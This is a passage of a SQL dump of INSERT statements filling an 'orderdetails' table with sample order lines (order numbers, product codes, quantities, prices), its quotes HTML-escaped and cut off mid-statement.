INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;130.68\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;169.34\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;132.80\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;37.00\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;55.11\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;139.03\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;70.33\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;33.39\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;100.01\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10331\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;74.04\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;89.38\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;51.21\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;53.88\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;116.96\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;138.38\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;53.09\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;100.53\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;92.03\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;70.56\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;61.73\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;47.29\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;29.87\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;43.01\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;84.51\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;108.04\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;77.91\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;94.23\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10332\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;34.47\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;188.58\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;121.64\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;110.84\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;95.23\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;95.24\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;42.26\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;95.44\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10333\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;62.05\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10334\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;130.01\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10334\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;108.00\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10334\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;52.87\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10334\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;147.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10334\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;101.71\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10334\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;117.57\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10335\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;32.88\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10335\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;77.05\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10335\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;49.78\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;176.63\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;126.91\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;141.88\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;95.99\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;153.91\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;135.22\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;100.84\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;49.71\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;113.55\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;59.03\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;109.96\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10336\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;94.07\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;131.92\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;140.75\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;76.36\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;119.20\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;54.48\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;73.62\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;84.14\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;83.42\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10337\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;49.14\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10338\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;137.19\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10338\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;80.86\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10338\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;93.17\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;117.75\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;178.17\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;79.41\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;48.46\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;96.92\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;106.14\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;67.82\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;73.46\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;57.86\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;72.96\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;57.32\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;53.34\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;86.90\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;62.16\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;66.63\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10339\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;49.66\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;62.46\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;63.76\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;95.89\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;67.41\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;37.09\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;73.99\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;81.77\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10340\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;98.48\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;84.22\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;192.62\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;120.50\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;111.57\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;77.41\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;109.40\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;63.03\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;95.93\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;78.11\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10341\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;70.40\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;118.89\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;63.14\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;115.22\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;167.65\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;76.39\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;136.70\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;57.82\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;124.99\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;30.59\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;60.01\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10342\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;112.34\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10343\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;109.51\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10343\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;118.80\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10343\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;127.15\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10343\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;44.78\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10343\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;76.80\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10343\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;37.41\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10344\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;168.30\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10344\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;49.04\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10344\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;118.23\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10344\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;80.99\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10344\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;68.42\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10344\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;61.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10344\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;27.88\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10345\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;38.98\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10346\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;88.36\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10346\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;87.24\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10346\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;117.44\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10346\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;80.47\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10346\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;103.87\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10346\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;38.57\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;188.58\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;132.97\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;132.57\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;113.17\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;46.36\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;51.05\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;136.69\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10347\u0026#39;, 